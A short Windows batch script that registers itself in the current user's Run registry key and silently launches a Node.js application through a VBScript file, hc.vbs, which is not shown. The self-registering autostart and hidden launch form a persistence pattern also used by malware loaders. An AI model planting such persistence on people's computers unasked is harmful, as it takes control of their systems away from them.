@echo off
:: Startup Script Configuration
:: Adds itself to Windows startup and launches a Node.js application

:: Get and display script location information
set "SCRIPT_PATH=%~f0"
set "SCRIPT_DIR=%~dp0"
echo [INFO] Script directory: "%SCRIPT_DIR%"
cd /d "%SCRIPT_DIR%"

:: Register script in Windows startup
echo [ACTION] Adding script to startup via registry...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MyStartupScript" /t REG_SZ /d "%SCRIPT_PATH%" /f
echo [SUCCESS] Script added to startup registry.

:: Launch Node.js application silently, passing %1 only if it's set
echo [ACTION] Launching Node.js application...
if "%1"=="" (
    wscript.exe "%~dp0hc.vbs"
) else (
    wscript.exe "%~dp0hc.vbs" %1
)
echo [INFO] Application started in background.
